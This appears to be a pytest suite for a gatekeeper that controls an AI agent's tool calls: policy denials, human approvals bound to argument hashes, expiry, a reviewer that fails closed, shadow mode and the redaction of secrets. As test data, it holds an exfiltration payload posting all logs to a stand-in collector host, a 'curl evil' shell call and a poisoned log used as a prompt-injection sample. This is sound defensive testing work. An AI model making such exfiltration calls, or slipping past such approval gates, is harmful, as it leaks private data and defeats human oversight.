"""Enforcement tests for the gatekeeper, without HTTP or a model."""

from __future__ import annotations

import asyncio
import contextlib
from pathlib import Path
from typing import Any

import pytest

from agentguard.gate import ResolveError
from agentguard.models import ActionState, Enforcement, RunMode, RunState
from agentguard.reviewers.base import StaticReviewer
from agentguard.store import ActionRecord, RunRecord
from tests.conftest import GateEnv

ATTACKER = "203.0.113.42"
BLOCK = {
    "ip": ATTACKER,
    "reason": "18 failed logins then a success (EVT-0004..EVT-0022)",
    "duration_minutes": 60,
}
EXFIL = {"url": "https://collector.example/ingest", "body": "all the logs"}


async def read_alice(env: GateEnv, run: RunRecord) -> None:
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert not out.is_error, out.text


async def wait_for_action(env: GateEnv, run_id: str, state: str, timeout: float = 3.0) -> ActionRecord:
    deadline = asyncio.get_running_loop().time() + timeout
    while True:
        matches = [a for a in env.store.list_actions(run_id) if a.state == state]
        if matches:
            return matches[-1]
        if asyncio.get_running_loop().time() > deadline:
            raise AssertionError(
                f"no action reached {state}: {[a.state for a in env.store.list_actions(run_id)]}"
            )
        await asyncio.sleep(0.01)


async def pending_block(env: GateEnv, run: RunRecord, args: dict[str, Any] | None = None):
    task = asyncio.create_task(env.gate.handle_call(run.id, "block_ip", args or BLOCK))
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    return task, action


def executions(env: GateEnv, run: RunRecord, tool: str | None = None) -> list[dict[str, Any]]:
    return env.store.executions(run.id, tool)


# --- allowed reads -------------------------------------------------------------


async def test_authorized_read_executes_and_returns_evidence(env: GateEnv, no_network: list) -> None:
    run = env.run()
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert not out.is_error
    assert "EVT-0022" in out.text and "untrusted data" in out.text
    action = env.store.get_action(out.action_id)
    assert action is not None and action.state == ActionState.SUCCEEDED
    assert env.event_types(run.id)[-3:] == ["tool.proposed", "policy.evaluated", "tool.executed"]
    session = env.store.get_run(run.id).session  # type: ignore[union-attr]
    assert ATTACKER in session["seen_ips"] and "reads_private" in session["labels"]
    assert len(executions(env, run)) == 1
    assert no_network == []


# --- rejected before execution -------------------------------------------------


async def test_unknown_tool_rejected(env: GateEnv) -> None:
    run = env.run()
    out = await env.gate.handle_call(run.id, "run_shell", {"cmd": "curl evil"})
    assert out.is_error and "builtin:unknown-tool" in out.text
    assert executions(env, run) == []


@pytest.mark.parametrize(
    "args",
    [
        {"user": "alice", "dataset": "someone-elses"},
        {"user": 7},
        {},
        ["alice"],
    ],
)
async def test_malformed_args_rejected_before_execution(env: GateEnv, args: Any) -> None:
    run = env.run()
    out = await env.gate.handle_call(run.id, "get_user_logins", args)
    assert out.is_error and "builtin:invalid-args" in out.text
    assert executions(env, run) == []
    session = env.store.get_run(run.id).session  # type: ignore[union-attr]
    assert session["invalid_calls"] == 1 and session["policy_denials"] == 0


async def test_out_of_scope_user_denied(env: GateEnv) -> None:
    run = env.run()
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "bob"})
    assert out.is_error and "R-02-read-other-user" in out.text
    assert executions(env, run) == []


# --- exfiltration ---------------------------------------------------------------


async def test_external_upload_after_reading_logs_is_denied(env: GateEnv, no_network: list) -> None:
    run = env.run()
    await read_alice(env, run)
    out = await env.gate.handle_call(run.id, "http_post", EXFIL)
    assert out.is_error and "R-21-no-exfil-after-private-read" in out.text
    assert executions(env, run, "http_post") == []
    assert no_network == []
    assert env.store.get_run(run.id).state == RunState.RUNNING  # type: ignore[union-attr]


async def test_poisoned_log_is_treated_as_data_and_flagged(env: GateEnv) -> None:
    run = env.run(dataset="poisoned")
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert not out.is_error
    assert "<tool_output>" in out.text  # delivered as data inside a delimiter
    types = env.event_types(run.id)
    assert "result.flagged" in types
    session = env.store.get_run(run.id).session  # type: ignore[union-attr]
    assert "injection_suspected" in session["labels"]
    follow = await env.gate.handle_call(
        run.id, "http_post", {"url": "https://collector.example", "body": "logs"}
    )
    assert follow.is_error and executions(env, run, "http_post") == []


async def test_internal_notes_post_is_allowed_after_review(tmp_path: Path) -> None:
    rev = StaticReviewer()  # sees nothing wrong
    env = GateEnv(tmp_path, reviewer=rev)
    run = env.run()
    await read_alice(env, run)
    out = await env.gate.handle_call(
        run.id, "http_post", {"url": "https://soc-notes.internal.example/notes", "body": "summary"}
    )
    assert not out.is_error
    assert len(executions(env, run, "http_post")) == 1
    assert [c.tool for c in rev.calls] == ["http_post"], "only egress is reviewed"


async def test_ip_lookup_without_a_reason_needs_approval(env: GateEnv) -> None:
    run = env.run()
    task = asyncio.create_task(env.gate.handle_call(run.id, "get_ip_activity", {"ip": "192.0.2.50"}))
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    assert action.decision is not None and action.decision["rule_ids"] == ["R-04-ip-lookup-needs-a-reason"]
    env.gate.cancel_run(run.id, "t")
    await task


async def test_ip_lookup_is_allowed_when_task_or_evidence_mentions_it(env: GateEnv) -> None:
    run = env.run(task="Check what 192.0.2.50 did yesterday.")
    assert not (await env.gate.handle_call(run.id, "get_ip_activity", {"ip": "192.0.2.50"})).is_error
    run2 = env.run()
    await read_alice(env, run2)  # evidence now includes 203.0.113.42
    assert not (await env.gate.handle_call(run2.id, "get_ip_activity", {"ip": ATTACKER})).is_error


async def test_secrets_are_redacted_before_reaching_the_agent(env: GateEnv) -> None:
    run = env.run(subject="bob")
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "bob"})
    assert "Autumn#2026" not in out.text and "[REDACTED]" in out.text
    stored = env.store.get_action(out.action_id)
    assert stored is not None and "Autumn#2026" not in str(stored.result)
    assert all("Autumn#2026" not in str(e.payload) for e in env.store.events_after(run.id))


# --- approvals ------------------------------------------------------------------


async def test_block_without_evidence_is_denied_not_pending(env: GateEnv) -> None:
    run = env.run()
    out = await env.gate.handle_call(run.id, "block_ip", BLOCK)
    assert out.is_error and "R-11-block-needs-evidence" in out.text


async def test_block_stays_pending_with_zero_executions(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, _action = await pending_block(env, run)
    await asyncio.sleep(0.1)
    assert not task.done()
    assert executions(env, run, "block_ip") == []
    assert env.gate.metrics(run.id)["pending_approvals"] == 1
    env.gate.cancel_run(run.id, "tester")
    await task


async def test_approve_once_executes_exactly_once_with_approved_args(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run, {**BLOCK, "ip": f"  {ATTACKER} "})
    assert action.args is not None and action.args["ip"] == ATTACKER
    resolved = env.gate.resolve_approval(
        action.id, approve=True, approver="ana", args_hash=action.args_hash or ""
    )
    assert resolved.state == ActionState.APPROVED and resolved.approver == "ana"
    out = await asyncio.wait_for(task, 2)
    assert not out.is_error and "mock-applied" in out.text
    ledger = executions(env, run, "block_ip")
    assert len(ledger) == 1 and ledger[0]["args"] == action.args
    with pytest.raises(ResolveError) as err:
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    assert err.value.status == 409
    assert len(executions(env, run, "block_ip")) == 1


async def test_human_deny_means_zero_executions_and_run_continues(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    env.gate.resolve_approval(
        action.id, approve=False, approver="ana", args_hash=action.args_hash or "", note="no"
    )
    out = await asyncio.wait_for(task, 2)
    assert out.is_error and "declined" in out.text
    assert executions(env, run, "block_ip") == []
    fresh = env.store.get_run(run.id)
    assert fresh is not None and fresh.state == RunState.RUNNING and fresh.session["human_denials"] == 1
    m = env.gate.metrics(run.id)
    assert m["human_denials"] == 1 and m["policy_denials"] == 0


async def test_expired_approval_never_executes(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    env.clock.advance(301)
    out = await asyncio.wait_for(task, 2)
    assert out.is_error and out.state == ActionState.EXPIRED
    with pytest.raises(ResolveError, match="action is expired"):
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    assert executions(env, run, "block_ip") == []


async def test_expiry_is_checked_at_resolution_time(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    env.gate.approval_poll_seconds = 60  # waiter will not notice on its own
    task, action = await pending_block(env, run)
    env.clock.advance(301)
    with pytest.raises(ResolveError, match="expired"):
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    out = await asyncio.wait_for(task, 2)
    assert out.state == ActionState.EXPIRED and executions(env, run, "block_ip") == []


async def test_approval_bound_to_argument_hash(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    other = {**BLOCK, "duration_minutes": 1440}
    from agentguard.canonical import args_hash

    with pytest.raises(ResolveError, match="arguments differ"):
        env.gate.resolve_approval(
            action.id, approve=True, approver="ana", args_hash=args_hash("block_ip", other)
        )
    still = env.store.get_action(action.id)
    assert still is not None and still.state == ActionState.PENDING_APPROVAL
    env.gate.cancel_run(run.id, "tester")
    await task
    assert executions(env, run, "block_ip") == []


async def test_policy_change_invalidates_pending_approval(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    env.set_policy("approval_ttl_seconds: 300", "approval_ttl_seconds: 120")
    with pytest.raises(ResolveError, match="policy changed"):
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    out = await asyncio.wait_for(task, 2)
    assert out.state == ActionState.INVALIDATED and executions(env, run, "block_ip") == []


async def test_policy_change_between_approval_and_execution_blocks_execution(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    # The waiter has been notified but has not run yet; tighten the policy now.
    env.set_policy("approval_ttl_seconds: 300", "approval_ttl_seconds: 120")
    out = await asyncio.wait_for(task, 2)
    assert out.state == ActionState.INVALIDATED and executions(env, run, "block_ip") == []


async def test_concurrent_approvals_yield_one_effect(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)

    def attempt() -> bool:
        try:
            env.gate.resolve_approval(
                action.id, approve=True, approver="ana", args_hash=action.args_hash or ""
            )
            return True
        except ResolveError:
            return False

    results = await asyncio.gather(*(asyncio.to_thread(attempt) for _ in range(10)))
    assert results.count(True) == 1
    await asyncio.wait_for(task, 2)
    assert len(executions(env, run, "block_ip")) == 1


async def test_hard_denied_action_cannot_be_approved(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    out = await env.gate.handle_call(run.id, "http_post", EXFIL)
    denied = env.store.get_action(out.action_id)
    assert denied is not None and denied.state == ActionState.DENIED
    with pytest.raises(ResolveError) as err:
        env.gate.resolve_approval(denied.id, approve=True, approver="ana", args_hash=denied.args_hash or "")
    assert err.value.status == 409 and executions(env, run, "http_post") == []


async def test_cancel_while_awaiting_approval(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    assert env.gate.cancel_run(run.id, "ana")
    out = await asyncio.wait_for(task, 2)
    assert out.is_error and out.state == ActionState.CANCELLED
    with pytest.raises(ResolveError):
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    assert executions(env, run, "block_ip") == []
    after = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert after.is_error and "builtin:run-inactive" in after.text


async def test_agent_disconnect_cancels_pending_approval(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task
    fresh = env.store.get_action(action.id)
    assert fresh is not None and fresh.state == ActionState.CANCELLED
    with pytest.raises(ResolveError):
        env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")


async def test_progress_updates_are_sent_while_waiting(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    messages: list[str] = []

    async def progress(msg: str) -> None:
        messages.append(msg)

    task = asyncio.create_task(env.gate.handle_call(run.id, "block_ip", BLOCK, progress))
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    await asyncio.sleep(0.1)
    env.gate.resolve_approval(action.id, approve=False, approver="ana", args_hash=action.args_hash or "")
    await task
    assert len(messages) >= 2 and "approve block_ip" in messages[0]


# --- limits and halting -----------------------------------------------------------


async def test_repeated_policy_denials_halt_the_run(env: GateEnv) -> None:
    run = env.run()
    outs = [await env.gate.handle_call(run.id, "get_user_logins", {"user": "bob"}) for _ in range(3)]
    assert all(o.is_error for o in outs)
    out = outs[-1]
    assert "run has been stopped" in out.text
    fresh = env.store.get_run(run.id)
    assert fresh is not None and fresh.state == RunState.HALTED
    assert "run.halted" in env.event_types(run.id)


async def test_tool_call_limit(env: GateEnv) -> None:
    env.set_policy("max_tool_calls: 16", "max_tool_calls: 2")
    run = env.run()
    await read_alice(env, run)
    await read_alice(env, run)
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert out.is_error and "builtin:limit-tool-calls" in out.text
    assert env.store.get_run(run.id).state == RunState.HALTED  # type: ignore[union-attr]


async def test_run_time_limit(env: GateEnv) -> None:
    run = env.run()
    env.clock.advance(601)
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert out.is_error and "builtin:limit-run-time" in out.text
    assert executions(env, run) == []


# --- shadow mode -------------------------------------------------------------------


async def test_shadow_mode_records_but_does_not_block(env: GateEnv) -> None:
    run = env.run(enforcement=Enforcement.SHADOW)
    await read_alice(env, run)
    out = await env.gate.handle_call(run.id, "http_post", EXFIL)
    assert not out.is_error
    action = env.store.get_action(out.action_id)
    assert action is not None and action.shadow_effect == "deny" and not action.enforced
    assert "shadow.would_block" in env.event_types(run.id)
    assert env.gate.metrics(run.id)["shadow_would_block"] == 1


async def test_shadow_mode_still_rejects_invalid_calls(env: GateEnv) -> None:
    run = env.run(enforcement=Enforcement.SHADOW)
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice", "extra": 1})
    assert out.is_error and executions(env, run) == []


# --- reviewer ------------------------------------------------------------------------


def reviewer_env(tmp_path: Path, reviewer: StaticReviewer) -> GateEnv:
    return GateEnv(tmp_path, reviewer=reviewer)  # the default policy enables the reviewer for egress


NOTES = {"url": "https://soc-notes.internal.example/notes", "body": "summary"}


async def test_reviewer_can_escalate_an_allowed_action(tmp_path: Path) -> None:
    rev = StaticReviewer(escalate_tools={"http_post"})
    env = reviewer_env(tmp_path, rev)
    run = env.run()
    await read_alice(env, run)
    task = asyncio.create_task(env.gate.handle_call(run.id, "http_post", NOTES))
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    assert action.decision is not None and action.decision["rule_ids"] == ["builtin:reviewer-escalation"]
    assert rev.calls and rev.calls[0].task == run.task
    env.gate.resolve_approval(action.id, approve=True, approver="ana", args_hash=action.args_hash or "")
    assert not (await task).is_error


async def test_reviewer_outside_review_labels_is_not_consulted(tmp_path: Path) -> None:
    rev = StaticReviewer(escalate_tools={"get_user_logins", "get_ip_activity"})
    env = reviewer_env(tmp_path, rev)
    run = env.run()
    await read_alice(env, run)
    assert not (await env.gate.handle_call(run.id, "get_ip_activity", {"ip": ATTACKER})).is_error
    assert rev.calls == []


async def test_reviewer_never_relaxes_a_denial(tmp_path: Path) -> None:
    rev = StaticReviewer()
    env = reviewer_env(tmp_path, rev)
    run = env.run()
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "bob"})
    assert out.is_error and rev.calls == []


async def test_reviewer_outage_fails_closed_for_sensitive_tools(tmp_path: Path) -> None:
    rev = StaticReviewer(fail=True)
    env = reviewer_env(tmp_path, rev)
    run = env.run()
    await read_alice(env, run)  # reads are outside review_labels: never sent to the reviewer
    read = env.store.list_actions(run.id)[-1]
    assert read.decision is not None and read.decision["review"] is None
    task = asyncio.create_task(
        env.gate.handle_call(run.id, "http_post", {"url": "https://soc-notes.internal.example/", "body": "x"})
    )
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    assert action.decision is not None and action.decision["rule_ids"] == ["builtin:reviewer-unavailable"]
    env.gate.cancel_run(run.id, "t")
    await task
    assert executions(env, run, "http_post") == []


async def test_reviewer_timeout_counts_as_outage(tmp_path: Path) -> None:
    rev = StaticReviewer(delay=5)
    env = reviewer_env(tmp_path, rev)
    env.set_policy("timeout_seconds: 3", "timeout_seconds: 0.05")
    run = env.run()
    task = asyncio.create_task(
        env.gate.handle_call(run.id, "http_post", {"url": "https://soc-notes.internal.example/", "body": "x"})
    )
    action = await wait_for_action(env, run.id, ActionState.PENDING_APPROVAL)
    assert "TimeoutError" in action.decision["review"]["error"]  # type: ignore[index]
    env.gate.cancel_run(run.id, "t")
    await task


# --- lifecycle ---------------------------------------------------------------------


async def test_restart_recovery_fails_closed(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    task, action = await pending_block(env, run)
    task.cancel()  # simulate the process dying: waiter gone...
    with contextlib.suppress(asyncio.CancelledError):
        await task
    # ...but pretend the cancel handler never ran, as in a crash.
    env.store.transition_action(action.id, [ActionState.CANCELLED], ActionState.PENDING_APPROVAL)
    env.gate.recover_after_restart()
    fresh = env.store.get_action(action.id)
    assert fresh is not None and fresh.state == ActionState.EXPIRED
    assert env.store.get_run(run.id).state == RunState.FAILED  # type: ignore[union-attr]


async def test_summary_citations_are_checked(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    env.gate.complete_run(
        run.id, "Alice: EVT-0004..EVT-0021 failed, EVT-0022 succeeded. Also EVT-0025, EVT-9999."
    )
    fresh = env.store.get_run(run.id)
    assert fresh is not None and fresh.state == RunState.COMPLETED
    check = fresh.summary_check or {}
    assert check["unknown"] == ["EVT-9999"]
    assert check["not_seen_by_agent"] == ["EVT-0025"]  # bob's event was never returned to this run


async def test_metrics_count_proposals(env: GateEnv) -> None:
    run = env.run()
    await read_alice(env, run)
    await env.gate.handle_call(run.id, "get_user_logins", {"user": "bob"})
    await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice", "bogus": True})
    m = env.gate.metrics(run.id)
    assert m == {
        "checked": 3,
        "policy_denials": 1,
        "invalid": 1,
        "human_denials": 0,
        "pending_approvals": 0,
        "approvals_requested": 0,
        "executed": 1,
        "failed": 0,
        "shadow_would_block": 0,
    }


async def test_external_run_starts_on_first_call(env: GateEnv) -> None:
    run = env.run(start=False, mode=RunMode.EXTERNAL)
    assert run.state == RunState.CREATED
    await read_alice(env, run)
    assert env.store.get_run(run.id).state == RunState.RUNNING  # type: ignore[union-attr]


async def test_live_run_refuses_calls_until_launcher_starts_it(env: GateEnv) -> None:
    """A live run starts only after the launcher verifies the agent is locked down."""
    run = env.run(start=False, mode=RunMode.LIVE)
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert out.is_error and "builtin:run-inactive" in out.text
    assert executions(env, run) == []


async def test_policy_evaluation_error_denies_at_the_gate(tmp_path: Path) -> None:
    env = GateEnv(tmp_path)
    env.set_policy(
        "      - { path: args.user, op: eq, ref: run.subject }",
        "      - { path: args.user, op: eq, ref: run.no_such_field }",
    )
    run = env.run()
    out = await env.gate.handle_call(run.id, "get_user_logins", {"user": "alice"})
    assert out.is_error and "builtin:policy-error" in out.text
    assert executions(env, run) == []


async def test_tool_failure_is_reported_not_invented(env: GateEnv, monkeypatch: pytest.MonkeyPatch) -> None:
    import dataclasses

    spec = env.registry.get("get_ip_activity")
    assert spec is not None

    def broken(ctx: Any, args: Any) -> dict[str, Any]:
        raise ConnectionError("log store unreachable")

    env.registry._tools["get_ip_activity"] = dataclasses.replace(spec, handler=broken)
    run = env.run()
    await read_alice(env, run)
    out = await env.gate.handle_call(run.id, "get_ip_activity", {"ip": ATTACKER})
    assert out.is_error and "log store unreachable" in out.text
    action = env.store.get_action(out.action_id)
    assert action is not None and action.state == ActionState.FAILED and action.result is None
    assert "tool.failed" in env.event_types(run.id)
    assert env.gate.metrics(run.id)["failed"] == 1 and env.gate.metrics(run.id)["executed"] == 1
    assert env.store.get_run(run.id).state == RunState.RUNNING  # type: ignore[union-attr]
